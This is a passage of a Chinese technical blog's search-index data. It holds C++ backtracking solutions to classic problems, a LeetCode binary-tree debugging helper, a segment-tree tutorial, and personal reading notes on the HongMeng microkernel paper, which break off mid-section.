jobs[curSche[j]][0];\t\t\tf2[idx + 1] = ((f2[idx] &gt; f1) ? f2[idx] : f1) + jobs[curSche[j]][1];\t\t\tcurSum += f2[idx + 1];\t\t\tif (curSum &lt; res) &#123; // 剪枝（若当前累计和已经大于等于最优解，则不继续向下搜索）\t\t\t\tswap(curSche[idx], curSche[j]);\t\t\t\tdfs(idx + 1);\t\t\t\tswap(curSche[idx], curSche[j]);\t\t\t&#125;\t\t\t// 回溯\t\t\tf1 -= jobs[curSche[j]][0];\t\t\tcurSum -= f2[idx + 1];\t\t&#125;\t&#125;;\tdfs(0); // 递归搜索\t// 打印最优调度方案\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tcout &lt;&lt; optimSche[i];\t\tif (i &lt; n - 1) cout &lt;&lt; &quot;-&gt;&quot;;\t&#125;\treturn res;&#125;\n符号三角形问题题目描述\n解题代码int signedTriangle(int n) &#123;\tint num = n * (n + 1) / 2; // 三角形符号总数\tif (num % 2 == 1) return 0; // 总数为奇数，不可能相等\tvector&lt;bool&gt; triangles(num, false); // false代表&#x27;+&#x27;,true代表&#x27;-&#x27;\tint res = 0; // 合法图形个数\tvector&lt;vector&lt;bool&gt;&gt; fullShape; // 所有合法图形\t// 递归搜索函数\tfunction&lt;void(int)&gt; dfs = [&amp;](int idx) &#123;\t\tif (idx == n) &#123; // 到达最大搜索深度，判断是否可行\t\t\tint pCnt = num / 2, sCnt = num / 2; // 剩余&#x27;+&#x27;,&#x27;-&#x27;的符号个数\t\t\tvector&lt;bool&gt; newShape; // 当前图形\t\t\tqueue&lt;bool&gt; q, nq; // 轮换队列\t\t\tfor (int i = 0; i &lt; n; ++i) &#123; // 将第一行符号加入队列\t\t\t\tq.emplace(triangles[i]);\t\t\t\tnewShape.emplace_back(triangles[i]);\t\t\t\t--(triangles[i] ? sCnt : pCnt);\t\t\t&#125;\t\t\twhile (q.size() &gt; 1) &#123;\t\t\t\twhile (q.size() &gt; 1) &#123;\t\t\t\t\tbool ft = q.front();\t\t\t\t\tq.pop();\t\t\t\t\tbool nt = ft ^ q.front(); // 队列前两个符号异或得到下面的符号\t\t\t\t\tnq.emplace(nt);\t\t\t\t\t--(nt ? sCnt : pCnt);\t\t\t\t\tif (sCnt * pCnt &lt; 0) return; // 其中一个符号个数超过一半\t\t\t\t\tnewShape.emplace_back(nt);\t\t\t\t&#125;\t\t\t\tq = move(nq); // 队列轮换（利用右值引用进行资源所有权的交换）\t\t\t&#125;\t\t\t// 该结果合法\t\t\t++res;\t\t\tfullShape.emplace_back(newShape);\t\t\treturn;\t\t&#125;\t\ttriangles[idx] = true;\t\tdfs(idx + 1);\t\ttriangles[idx] = false;\t\tdfs(idx + 1);\t&#125;;\tdfs(0); // 递归搜索\t// 打印所有合法图形\tfor (const auto&amp; shape : fullShape) &#123;\t\tfor (int col = n; col &gt;= 1; --col) &#123;\t\t\tint di = (n - col) * (n + col + 1) / 2;\t\t\tfor (int i = 0; i &lt; col; ++i) &#123;\t\t\t\tcout &lt;&lt; shape[i + di];\t\t\t&#125;\t\t\tcout &lt;&lt; endl;\t\t&#125;\t\tcout &lt;&lt; &quot;\\n&quot; &lt;&lt; endl;\t&#125;\treturn res;&#125;\nN皇后题目描述\n解题代码vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n) &#123;    vector&lt;vector&lt;string&gt;&gt; res; // 存放所有解    vector&lt;string&gt; chessBoard(n, string(n, &#x27;.&#x27;)); // 当前棋盘状态    // 检查该位置(r,c)是否能够放置棋子    auto check = [&amp;](int r, int c) -&gt; bool &#123;        for (int i = 0; i &lt; r; ++i) &#123;            // 从上往下依次检查棋盘第c列是否已放置棋子            if (chessBoard[i][c] == &#x27;Q&#x27;) &#123;                return false;            &#125;            // 从下往上依次检查左斜上方是否已放置棋子            int li = r - i - 1, lj = c - i - 1;            if (li &gt;= 0 &amp;&amp; lj &gt;= 0 &amp;&amp; chessBoard[li][lj] == &#x27;Q&#x27;) &#123;                return false;            &#125;            // 从下往上依次检查右斜上方是否已放置棋子            int ri = r - i - 1, rj = c + i + 1;            if (ri &gt;= 0 &amp;&amp; rj &lt; n &amp;&amp; chessBoard[ri][rj] == &#x27;Q&#x27;) &#123;                return false;            &#125;        &#125;        return true;    &#125;;    // 递归搜索函数    function&lt;void(int)&gt; dfs = [&amp;](int idx) &#123;        if (idx == n) &#123; // 到达最大深度，得到一个合法解            res.emplace_back(chessBoard);            return;        &#125;        for (int j = 0; j &lt; n; ++j) &#123;            if (!check(idx, j)) continue; // 当前位置不可放置            chessBoard[idx][j] = &#x27;Q&#x27;; // 放置棋子            dfs(idx + 1);            chessBoard[idx][j] = &#x27;.&#x27;; // 回溯        &#125;    &#125;;    dfs(0);    return res;&#125;\n最大团问题题目描述\n解题代码// 图的邻接矩阵形式struct MGraph &#123;\tvector&lt;char&gt; vertices; // 顶点数组（元素为字符类型）\t// 邻接矩阵，edges[u][v] == INT32_MAX ? 无边 : 存在权值为edges[u][v]的边\tvector&lt;vector&lt;int&gt;&gt; edges;&#125;;vector&lt;vector&lt;char&gt;&gt; largestGroup(MGraph&amp; G) &#123;\tint n = G.vertices.size(); // 顶点个数\t // 所有的最大团（每个最大团为一个char类型数组，其中元素为最大团顶点）\tvector&lt;vector&lt;char&gt;&gt; res;\tvector&lt;bool&gt; curGroup(n, false); // 当前团\tint maxSize = 0; // 团的最大顶点数\t// 递归搜索函数，idx为搜索深度，curSize为当前搜索状态下团的顶点个数\tfunction&lt;void(int, int)&gt; dfs = [&amp;](int idx, int curSize) &#123;\t\tif (idx == n) &#123; // 到达最大搜索深度\t\t\t// 构造最大团\t\t\tvector&lt;char&gt; group;\t\t\tfor (int i = 0; i &lt; n; ++i) &#123;\t\t\t\tif (curGroup[i]) &#123;\t\t\t\t\tgroup.emplace_back(G.vertices[i]);\t\t\t\t&#125;\t\t\t&#125;\t\t\t// 更新最优解\t\t\tif (curSize &gt; maxSize) &#123;\t\t\t\tres.clear();\t\t\t\tmaxSize = curSize;\t\t\t&#125;\t\t\tres.emplace_back(group);\t\t\treturn;\t\t&#125;\t\tbool flag = true; // 判断当前结点idx是否能够与当前团的每个结点相连\t\tfor (int j = 0; j &lt; idx; ++j) &#123;\t\t\tif (curGroup[j] &amp;&amp; G.edges[idx][j] == INT32_MAX) &#123;\t\t\t\tflag = false;\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t\tif (flag) &#123; // 如果相连，则构成一个更大的团，继续向下搜索\t\t\tcurGroup[idx] = true; // 加入团\t\t\tdfs(idx + 1, curSize + 1);\t\t\tcurGroup[idx] = false; // 回溯\t\t&#125;\t\t// 剪枝，若满足curSize + n - idx &lt;= maxSize\t\t// 则不可能得到比当前最大团更大的团，无需继续搜索\t\tif (curSize + n - idx &gt; maxSize) &#123;\t\t\tdfs(idx + 1, curSize);\t\t&#125;\t&#125;;\tdfs(0, 0);\treturn res;&#125;\n图的m着色问题题目描述\n解题代码// 图的邻接矩阵形式struct MGraph &#123;\tvector&lt;char&gt; vertices; // 顶点数组（元素为字符类型）\t// 邻接矩阵，edges[u][v] == INT32_MAX ? 无边 : 存在权值为edges[u][v]的边\tvector&lt;vector&lt;int&gt;&gt; edges;&#125;;vector&lt;vector&lt;int&gt;&gt; mColoring(MGraph&amp; G, int m) &#123;\tint n = G.vertices.size(); // 图的顶点个数\tvector&lt;vector&lt;int&gt;&gt; res; // 所有着色方案，若无合法着色方案，则为空\tvector&lt;int&gt; coloring(n, -1); // 当前着色方案\t// 检查所有与顶点idx相连的顶点j是否与顶点idx颜色相同，若相同，则此着色方案不合法\tauto check = [&amp;](int idx) -&gt; bool &#123;\t\tfor (int j = 0; j &lt; n; ++j) &#123;\t\t\tif (G.edges[idx][j] != INT32_MAX &amp;&amp; coloring[idx] == coloring[j]) &#123;\t\t\t\treturn false;\t\t\t&#125;\t\t&#125;\t\treturn true;\t&#125;;\t// 递归搜索函数\tfunction&lt;void(int)&gt; dfs = [&amp;](int idx) &#123;\t\tif (idx == n) &#123; // 到达最大搜索深度，将该着色方案加入解集中\t\t\tres.emplace_back(coloring);\t\t\treturn;\t\t&#125;\t\t// 遍历所有颜色，尝试为顶点idx进行着色\t\tfor (int j = 0; j &lt; m; ++j) &#123;\t\t\tcoloring[idx] = j; // 着色\t\t\tif (check(idx)) &#123; // 此着色合法，继续向下搜索\t\t\t\tdfs(idx + 1);\t\t\t&#125;\t\t\tcoloring[idx] = -1; // 回溯\t\t&#125;\t&#125;;\tdfs(0);\treturn res;&#125;\n圆排列问题题目描述\n解题代码double circlePermutation(vector&lt;double&gt;&amp; radius) &#123;\tint n = radius.size(); // 圆的个数\tdouble res = INT32_MAX; // 最小长度\tvector&lt;double&gt; optimalPerm; // 最小长度对应的排列方式\tvector&lt;double&gt; curX(n); // curX[i]表示当前排列下圆i的圆心横坐标\t// 计算当前排列下圆idx的圆心横坐标\tauto calCenter = [&amp;](int idx) -&gt; double &#123;\t\tdouble xMax = 0.0;\t\tfor (int j = 0; j &lt; idx; ++j) &#123;\t\t\tdouble x = curX[j] + 2.0 * sqrt(radius[idx] * radius[j]);\t\t\txMax = max(xMax, x);\t\t&#125;\t\treturn xMax;\t&#125;;\t// 计算当前排列下的总长度\tauto calLen = [&amp;]() -&gt; double &#123;\t\tdouble low = 0.0, high = 0.0;\t\tfor (int i = 0; i &lt; n; ++i) &#123;\t\t\tlow = min(low, curX[i] - radius[i]);\t\t\thigh = max(low, curX[i] + radius[i]);\t\t&#125;\t\treturn high - low;\t&#125;;\t// 递归搜索函数\tfunction&lt;void(int)&gt; dfs = [&amp;](int idx) &#123;\t\tif (idx == n) &#123; // 到达最大搜索深度\t\t\tdouble len = calLen();\t\t\tif (len &lt; res) &#123; // 更新最优解\t\t\t\tres = len;\t\t\t\toptimalPerm = radius;\t\t\t&#125;\t\t&#125;\t\tfor (int j = idx; j &lt; n; ++j) &#123; // 全排列\t\t\tswap(radius[idx], radius[j]);\t\t\tdouble centerX = calCenter(idx);\t\t\tif (centerX + radius[idx] + radius[0] &lt; res) &#123; // 剪枝\t\t\t\tcurX[idx] = centerX;\t\t\t\tdfs(idx + 1);\t\t\t&#125;\t\t\tswap(radius[idx], radius[j]);\t\t&#125;\t&#125;;\tdfs(0);\t// 打印最优解对应的圆排列\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tcout &lt;&lt; optimalPerm[i] &lt;&lt; &quot; &quot;;\t&#125;\treturn res;&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"高效的LeetCode二叉树本地IDE调试方案","url":"/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/","content":"在 LeetCode 刷题过程中，有时候遇到一些难以难以直接观察出来的错误，此时通常想要利用单步调试来解决，但奈何只有 LeetCode Plus 会员才可以使用其网页的调试功能。好在绝大部分本地 IDE 都具备十分强大的调试功能，我们只需要将自己的解题代码复制到本地，并编写简单的测试程序即可。但是对于二叉树相关的题，测试数据的编写显得不那么容易，本文编写了一个匹配 LeetCode 题目中的二叉树定义的类，该类包含一些基本的静态函数，能够很方便地实现二叉树的构造和二叉树的遍历。\nLeetCode 二叉树的序列表示方式LeetCode 中针对二叉树的输入数据以一个层序遍历序列的形式给出。与通常我们所说的层序序列不同的是，该层序序列包含从根节点到最后一个非空结点之间的所有空结点，该空结点以 null 的标识符给出，以此保证根据此序列所构造二叉树的唯一性（单纯依靠常规的不含空结点的层序序列无法构造一棵唯一的二叉树）。以下是一个简单的例子：\n输入： root = [3, 9, 20, null, null, 15, 7]\n\n带构造与遍历的二叉树类为了方便能在本地 IDE 中直接根据输入数据的格式构造二叉树，本文编写了两个简单的静态方法，来方便数据的输入与输出。\n#define null INT32_MAXstruct TreeNode &#123;\tint val;\tTreeNode* left, * right;\tTreeNode(int val = 0, TreeNode* left = nullptr, TreeNode* right = nullptr)\t\t: val(val), left(left), right(right) &#123;&#125;\t// 带空结点的层序遍历\tstatic void orderTraversalWithNull(TreeNode* root) &#123;\t\tif (root == nullptr) return;\t\tqueue&lt;TreeNode*&gt; q;\t\tq.emplace(root);\t\tvector&lt;string&gt; buf; // 输出缓冲\t\twhile (!q.empty()) &#123;\t\t\tTreeNode* fNode = q.front();\t\t\tq.pop();\t\t\tif (fNode == nullptr) &#123;\t\t\t\tbuf.emplace_back(&quot;null&quot;);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tbuf.emplace_back(to_string(fNode-&gt;val));\t\t\tq.emplace(fNode-&gt;left);\t\t\tq.emplace(fNode-&gt;right);\t\t&#125;\t\twhile (buf.back() == &quot;null&quot;) &#123;\t\t\tbuf.pop_back(); // 去除末尾多余的空结点\t\t&#125;\t\tfor (const auto&amp; val : buf) &#123;\t\t\tcout &lt;&lt; val &lt;&lt; &quot; &quot;;\t\t&#125;\t&#125;\t// 根据层序序列创建二叉树\tstatic TreeNode* createTreeByOrder(vector&lt;int&gt;&amp; order) &#123;\t\tif (order.empty() || order.front() == null) return nullptr;\t\tqueue&lt;TreeNode*&gt; q;\t\tint idx = 0; // 指向当前结点的子结点\t\tTreeNode* root = new TreeNode(order[idx++]);\t\tq.emplace(root);\t\twhile (!q.empty()) &#123;\t\t\tTreeNode* fNode = q.front();\t\t\tq.pop();\t\t\tif (fNode == nullptr) continue;\t\t\tif (idx &lt; order.size()) &#123;\t\t\t\tTreeNode* lChild = nullptr;\t\t\t\tif (order[idx] != null) &#123;\t\t\t\t\tlChild = new TreeNode(order[idx]);\t\t\t\t&#125;\t\t\t\tfNode-&gt;left = lChild;\t\t\t\tq.emplace(lChild);\t\t\t\t++idx;\t\t\t&#125;\t\t\tif (idx &lt; order.size()) &#123;\t\t\t\tTreeNode* rChild = nullptr;\t\t\t\tif (order[idx] != null) &#123;\t\t\t\t\trChild = new TreeNode(order[idx]);\t\t\t\t&#125;\t\t\t\tfNode-&gt;right = rChild;\t\t\t\tq.emplace(rChild);\t\t\t\t++idx;\t\t\t&#125;\t\t&#125;\t\treturn root;\t&#125;&#125;;\n使用的方法也很简单，由于两个方法都是 TreeNode 类中的静态方法，可使用 :: 符对其进行调用。\nint main() &#123;\tvector&lt;int&gt; order = &#123; 3,9,20,null,null,15,7 &#125;;\tTreeNode* root = TreeNode::createTreeByOrder(order);\tfunc(root);\tTreeNode::orderTraversalWithNull(root);&#125;\n","categories":["数据结构与算法"],"tags":["算法","数据结构"]},{"title":"高效的区间二叉搜索树：线段树","url":"/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/","content":"与树状数组类似，线段树也是一种用来维护区间信息的数据结构，可以在对数时间复杂度内实现更新和查询等操作。但相较于树状数组多用于前缀和查询不同，线段树的应用范围更为广泛，例如区间最值等问题，代价是需要消耗更多的存储空间。\n结构对于一个长度为 7 的数组，根据该数组 nums 元素建立的线段树结构如下图所示。\n每个结点存储的值为区间 nums[L ~ R] 的元素和，其中根节点对应的 L = 0, R = 6，即整个数组的元素和。然后每一层的结点将区间均分为 [L, (L + R) / 2] 和 [(L + R) / 2 + 1, R] 两部分。注意按此方式进行划分，得到的两个子区间始终满足：左右区间长度分别为 len1 和 len2，且 len1 == len2 || len1 == len2 + 1。不难得知：这样的结构构成一个完全二叉树，因此使用顺序存储将会变得很方便：根节点下标为 0；对于每个下标为 idx 的结点，其左孩子下标为 2 * idx + 1，右孩子下标为 2 * idx + 2。\n\n构造由于叶子结点的 L 和 R 相等，其值正好为 nums[L]，而每个父结点的值为其两个子结点的值之和，因此可以利用动态规划的思想，先将每个叶子结点的值求出，再依次求出其对应的父结点的值，最终完成线段树的建立。\n有一个值得注意的细节就是关于线段树数组 tree 的长度问题。若线段树正好构成一个满二叉树，那么树的深度（令根结点深度为 1）为 logm + 1（m 为 nums 长度，正好为 2 的幂），则当 nums 的长度为 n （n 为任意正整数）时，树的深度为 ⌈logn⌉ + 1. \n若给树最底层的空结点也分配空间，则结点总数 cnt = 2⌈logn⌉ + 1 - 1.\n令 n = 2x，有 cnt = 2 * 2x - 1 = 2 * n - 3.\n令 n = 2x + 1，有 cnt = 4 * 2x - 1 = 4 * n - 5.\n可见始终有 cnt &lt; 4 * n，因此为了方便起见，通常情况下直接令 tree 的长度为 4 * n.\n查询查询区间 nums[p ~ q] 的元素和时，若正好可以查询到当前结点 node 对应的区间为 [L, R] 且有 L == p &amp;&amp; R == q，那么此时的 tree[node] 即为所要查找的区间和，直接返回即可；\n否则可将其进行拆分为两个子区间，查找这两个子区间的值，将其求和后返回。如需要查找 nums[2 ~ 4] 的元素和，可将其划分为 nums[2 ~ 3] + nums[4 ~ 4]，分别在根节点的左右两个子树中查找。\n更新更新与构造做法类似，同样是先修改叶子节点，再依次向上修改。\n不同之处在于更新每次只需要处理一个分支，时间开销 T(n) = T(n / 2) + O(1)，时间复杂度为 O(logn)；而构造时左右子树均需要处理，时间开销 T(n) = 2 * T(n / 2) + O(1)，时间复杂度为 O(n).\n代码实现class segmentTree &#123;private:\tint n;\tvector&lt;int&gt; tree;public:\tsegmentTree(vector&lt;int&gt;&amp; nums) : n(nums.size()), tree(4 * nums.size()) &#123;\t\tfunction&lt;void(int, int, int)&gt; build = [&amp;](int node, int low, int high) &#123;\t\t\tif (low == high) &#123;\t\t\t\ttree[node] = nums[low];\t\t\t\treturn;\t\t\t&#125;\t\t\tint mid = low + (high - low) / 2;\t\t\tbuild(node * 2 + 1, low, mid);\t\t\tbuild(node * 2 + 2, mid + 1, high);\t\t\ttree[node] = tree[2 * node + 1] + tree[2 * node + 2];\t\t&#125;;\t\tbuild(0, 0, n - 1);\t&#125;\tvoid changeVal(int idx, int val) &#123;\t\tfunction&lt;void(int, int, int)&gt; change = [&amp;](int node, int low, int high) &#123;\t\t\tif (low == high) &#123;\t\t\t\ttree[node] = val;\t\t\t\treturn;\t\t\t&#125;\t\t\tint mid = low + (high - low) / 2;\t\t\tif (idx &lt;= mid) &#123;\t\t\t\tchange(2 * node + 1, low, mid);\t\t\t&#125;\t\t\telse &#123;\t\t\t\tchange(2 * node + 2, mid + 1, high);\t\t\t&#125;\t\t\ttree[node] = tree[2 * node + 1] + tree[2 * node + 2];\t\t&#125;;\t\tchange(0, 0, n - 1);\t&#125;\tint rangeSum(int l, int r) &#123;\t\tfunction&lt;int(int, int, int, int, int)&gt; range = [&amp;](int l, int r, int node, int low, int high) -&gt; int &#123;\t\t\tif (l == low &amp;&amp; r == high) &#123;\t\t\t\treturn tree[node];\t\t\t&#125;\t\t\tint mid = low + (high - low) / 2;\t\t\tif (r &lt;= mid) &#123;\t\t\t\treturn range(l, r, 2 * node + 1, low, mid);\t\t\t&#125;\t\t\telse if (l &gt; mid) &#123;\t\t\t\treturn range(l, r, 2 * node + 2, mid + 1, high);\t\t\t&#125;\t\t\telse &#123;\t\t\t\treturn range(l, mid, 2 * node + 1, low, mid) + range(mid + 1, r, 2 * node + 2, mid + 1, high);\t\t\t&#125;\t\t&#125;;\t\treturn range(l, r, 0, 0, n - 1);\t&#125;&#125;;\n","categories":["数据结构与算法"],"tags":["算法","数据结构"]},{"title":"鸿蒙内核论文阅读分享","url":"/2025/10/02/%E9%B8%BF%E8%92%99%E5%86%85%E6%A0%B8%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E5%88%86%E4%BA%AB/","content":"国庆假期，无心工作，便把之前一直想读却没时间读的鸿蒙内核论文：《Microkernel Goes General: Performance and Compatibility in the HongMeng  Production Microkernel》拿出来读了一读，并记录下我的一些总结和想法。虽然操作系统内核是我的主要研究方向之一，但是平时的工作接触的都是 Linux 这样的宏内核操作系统，对微内核的了解只停留在理论层面，没有具体读过 Minix、seL4 等微内核的源码，甚至也没做过上交 IPADS 团队的 ChCore 操作系统实验，因此也只是一些粗浅的想法，图一乐就好。\n\n实现了哪些特性下图是论文中关于鸿蒙内核的架构图：\n\n首先是同时实现了对 Linux API 和 ABI 的兼容，因此不仅能够通过编译源码的方式运行面向 Linux 开发的应用程序，对于那些不开放源代码，直接以二进制形式进行分发的应用程序，也能够基于兼容层——ABI-compliant Shim 实现运行时兼容。除此之外，还实现了一个设备驱动的兼容层——Linux Driver Container，能够直接复用 Linux 的驱动程序。此外，它能够同时支持 AOSP 和 OpenHarmony 两套框架，能够运行 Android 应用程序和 OpenHarmony 应用程序。\n鸿蒙内核总体上遵循微内核的设计原则，即 操作系统内核仅保留必要的不可拆分的一部分，其余的部分都以服务的形式运行在用户态中 。但是引入了大量的折衷方案来实现可靠性和性能的平衡。\n\n原文描述：HM respects the core design principles of microkernels but not to the extreme, with careful compromises to address the performance and compatibility challenges in emerging scenarios.\n\nLinux 的问题文中总结了 Linux 内核存在的许多不足之处：首先是安全性和可靠性，当前 Linux 内核源代码已经超过 3000w 行，其中有 80% 的代码都是文件系统和设备驱动这些模块，而它们贡献了 Linux 发现的绝大多数漏洞，并且这些漏洞大多数都可以通过引入合适的隔离机制来规避。\n其次，Linux 内核主线的新特性引入基本是由服务端的需求来驱动的，这也并不奇怪，因为服务端确实是 Linux 最主要的应用领域。但是这可能会导致为其他应用场景带来负优化，而重新进行定制优化又需要大量的工程量。同时，由于内核 API 的频繁更新，这些专门的优化为了与主线进行同步，又可能带来大量额外的工作量，遇到接口差异过大的情况，甚至可能要重新进行设计。\n部署微内核所观察到的运行特征\n在新兴领域（智能手机、智能汽车等）中 IPC 频率迅速增长。因此只优化单次 IPC 的性能是不够的。\n分布式多服务器场景下部署的微内核操作系统，由于缺乏一些统一的共享数据结构（如文件描述符表等），会导致状态双重记账（state double bookkeeping），造成内存资源的浪费。\n能力机制（capability）的引入，虽然对内核对象进行了很好的保护，但是也导致了很大的性能开销。\n生态的兼容性不仅应该局限于 POSIX 兼容，因为这无法应对应用程序以二进制形式进行分发的情况。\n在新兴领域中进行部署需要高效的驱动复用。文中提到，对于智能手机和智能汽车这种复杂计算机系统来说，需要超过 700 个驱动程序被支持，而对这些驱动程序进行重写大概需要花费 5000 人年（person-years）的时间，同时还要花时间对其进行完善和迭代，成本异常巨大。\n\n鸿蒙的性能设计同步 RPC 式的 IPC 快速路径微内核请求系统服务的方式是通过 IPC，但是 IPC 通常假设通信的双方是对等的并且具有相同的执行模型。但是在新兴领域中，作者观察到绝大多数的 IPC 都是过程调用，即通信的双方存在明显的调用者（caller）和被调用者（callee）之分。因此鸿蒙内核采用的服务请求模型是同步式的 RPC。\n具体来说，鸿蒙内核采用了一种 RPC 式的线程迁移（thread migration）方法作为 IPC 快速路径。当发起 IPC 的时候，内核进行直接切换（direct switch），跳过调度器，并且只进行栈指针、pc 和保护域的切换。实现方法大概是：内核将服务函数的入口地址记录下来，同时准备一系列的执行栈池（其实就是预留一部分内存空间，并保留地址空间高地址作为栈指针）作为执行服务时的运行栈，应用请求服务时直接进行栈指针、pc 等的保留和恢复即可。\n这样仅需要切换少数寄存器的快速路径仍然会面临性能问题，原因是涉及到特权级和地址空间切换，会导致 Cache/TLB “污染”（pollution），造成 Cache/TLB 产生更多的 miss，访存速度下降。\n同时，IPC 还会带来一定的内存开销，严重时甚至可能导致 OOM（out-of-memory）。先前的一些研究工作尝试预分配栈池的方法，但是内存分配大小难以决策，因为每个请求服务的线程需要独立的栈。一种想法是在线程创建时就为该线程分配并绑定对应的服务栈，但是实际负载下的系统服务请求也大概遵循“二八定律”，存在大量的很少使用的系统服务，因此这种方法会导致大量的内存浪费。鸿蒙内核采用了一种折衷的方案：为使用频率高的服务进行预分配栈，而对于那些使用频率较低的服务则保留栈池的分配方式。\n差异化的隔离层级传统意义上的微内核设计要求只保留必要的内核（Core kernel）运行在内核态，其余的部分则以用户态进程的形式运行在用户态中。但是频繁的内核态/用户态切换会带来大量的性能开销。文中认为并非所有的服务都需要相同的隔离层级，为此引入了差异化隔离层级（differentiated isolation classes）的概念。具体来说，包含三种不同的层级：IC0、IC1、IC2.\n对于 IC0 而言，该层级适用于那些经过形式化验证的、且对性能要求极高的服务。目前只有一个，也就是 Linux ABI 兼容层——ABI compliant shim。内核与该层级的服务没有任何隔离（或者说内核也是运行在该层级），内核与该层级服务的通信直接就是函数调用。\n而 IC1 的要求相比 IC0 稍宽松，适用于那些经过验证、且对性能要求较高的服务。事实上，以处理器特权级的视角来看，IC1 和 IC0 一样，同样运行在内核模式（ARM 架构下为 EL1），但是引入了诸如 ARM watchpoint 和 Intel PKS 这样的硬件机制来防止跨域访问。也正是因为 IC1 与 IC0 同样运行在内核态，它们之间的切换也就带来了更小的开销。\n\n这里的 ARM watchpoint 和 Intel PKS 我不太了解，或与类似于 AMD SEV-SNP 的 VMPL 机制？\n\nIC2 则适用于那些对性能要求没那么高或包含第三方代码（如 Linux 驱动）的服务。该层级则直接运行在用户态下（ARM 架构下为 EL0），同时还引入不同的页表以带来地址空间的隔离。该隔离层级就是传统微内核服务所运行的层级，在此不过多赘述。\n灵活的组合传统的微内核设计要求不同的操作系统服务之间彼此相互独立，但是有时不同服务之间的协作关系是十分紧密的，强行隔离开势必带来高昂的开销。文中举了一个例子：当以文件映射（mmap）的方式访问文件内容时，由于文件内容被映射到了内存地址空间中，文件的读写需要频繁经过内存管理器，这种情景下文件系统和内存管理器两个服务就形成紧密的耦合关系，带来包括频繁 IPC 导致的运行时性能开销，以及状态（如 page cache）双重记账带来的内存占用开销。\n鸿蒙内核为此采用了一种可配置的方法，将这些可能耦合的服务进行合并（coalesc），合并后的服务之间将不存在隔离，彼此之间的 IPC 将转变为函数调用。\n\n这里所说的“合并”文中似乎没说具体是怎么实现的，感觉会很复杂。\n\n基于地址令牌的访问控制传统的微内核设计下，内核借助能力机制对内核对象进行保护，只有内核才能够对其进行直接访问，而系统服务要想访问则需要经过一个间接层。但是有些系统服务可能需要频繁地对内核对象（如页表）进行更新，这会带来大量的性能开销。\n为了解决这个问题，鸿蒙内核采用了一种基于地址令牌（address token）的访问控制机制，如下图所示。\n\n具体来说，每个内核对象都存放在一个特定的物理页面中。内核中维护了一个内核对象管理器（kernel object manager），要将对一个内核对象的访问权限授予某个系统服务，就需要直接将该对象对应的页面映射到该系统服务的地址空间中。这个映射得到的地址就作为一个“令牌”，允许系统服务直接对内核对象进行访问。这里的访问指的是直接经过硬件 MMU 完成虚实地址转换的访存，无需再次经过内核间接层的中转，效率大幅上升。\n其中，与页表条目的权限控制类似，地址令牌也包含“只读”和“可读可写”权限的区别。对于授予了只读权限的地址令牌来说，系统服务对内核对象的写入需要借助专门的 writev 系统调用，并在进行写入操作前，内核将根据相关元数据确认系统服务是否具备写入的权限，这其实就类似传统微内核下基于间接层的内核对象访问模式。\n无策略内核分页为了保证对系统内存有一个全局的认识（global view），以高效地实现 cgroup 和内存回收等特性，鸿蒙内核没有采用一些微内核（如 seL4）所采用的分布式的 pager（不知道怎么翻译准确，叫分页管理器？），而是采用了集中式的设计。且为了最小内核原则，选择将 pager 放在内核之外。\n但这样的设计会带来高昂的性能开销：在发生缺页异常时（假设是在用户态发生的），用户态陷入内核，在内核的缺页异常处理入口中，它将向内核之外的 pager 发起一个 IPC，随后 pager 对地址进行检查，若检查无误则分配一个新的页面，并返回到内核中对页表进行更新，最终返回用户态重新执行。\n为了改善这样的性能问题， 鸿蒙内核将会提前基于策略做出决策，并将一个无策略（policy-free）的页面异常处理机制放在内核中 。具体来说，内存管理器会为一些匿名内存区域提供一些预分配的物理页面（如下图所示），如果页面异常在这些内存范围内触发，那么内核将直接将其映射到预分配的物理页面，并且记录下操作日志（OPLog），该日志将被内存管理器用于对其内部状态进行异步更新。如果页面异常没有在这些内存范围内触发或者预分配的物理内存页面用尽，那么内核将向内存管理器发起 IPC 以慢速路径来处理。\n\n鸿蒙的兼容性设计Linux ABI 兼容鸿蒙内核实现 Linux ABI 兼容的基本设计采用了类似 WSL1 的方案：在 IC0 中引入 ABI-compliant shim，它会拦截应用程序发起的 Linux 系统调用，随后根据系统调用号的不同，将其通过 IPC 的方式转发至对应的系统服务来处理，以实现等价的功能。\n\n这里所谓拦截应用程序的系统调用，具体点说就是架构相关的系统调用指令，比如 x86_64 架构下的 syscall，ARM 架构下的 svc。\n\n但是传统的微内核设计下，很多状态都没有一个中心化的存储（central repository），例如文件描述符表，它保存在每个应用自己的地址空间中，这给很多系统调用的转译带来了麻烦。例如 fork，它不得不将分布在用户空间中的状态进行组装（assemble），这会引入巨大的复杂性和性能开销。因此一些 SOTA 微内核如 seL4、Fiasco 等直接选择不支持 fork，在 K42 中即便支持性能也非常差。\n鸿蒙内核的解决方法是将 ABI-compliant shim 作为中心存储，将文件描述符表等数据结构的统一存放在其中。\n\n这一块也有些似懂非懂。\n\n驱动容器先前的一些 Linux 驱动兼容方法，如移植和基于虚拟机的方法，都无法同时实现 高兼容性、合理的工程量以及不妥协的性能 。鸿蒙内核通过引入驱动容器（driver container）的方法，在这三者之间找到了一个甜点（sweet spot）。\n驱动容器的基本设计方法为：通过复用 Linux 的代码，并将其作为用户空间的运行时，相当于为驱动程序提供了其所调用的 Linux 内核 API，这样就可以让驱动程序在无需修改的情况下直接运行，并能够直接对硬件设备进行访问。\n\n这一块有些不理解，驱动容器在 HM 内核的设计下，按理说是运行在用户态（IC2）的，为什么能直接进行 I/O 操作？如果是内核将对应的 MMIO 地址 mmap 到驱动容器的地址空间中，是否会很不安全？\n\n如下图所示，鸿蒙内核引入了驱动管理器（device manager），同时对 Linux 驱动容器和原生的驱动容器进行管理。除了初始化驱动容器之外，它还在 VFS 中注册一些入口，以便驱动通过 VFS 发起请求（如 ioctl）时，VFS 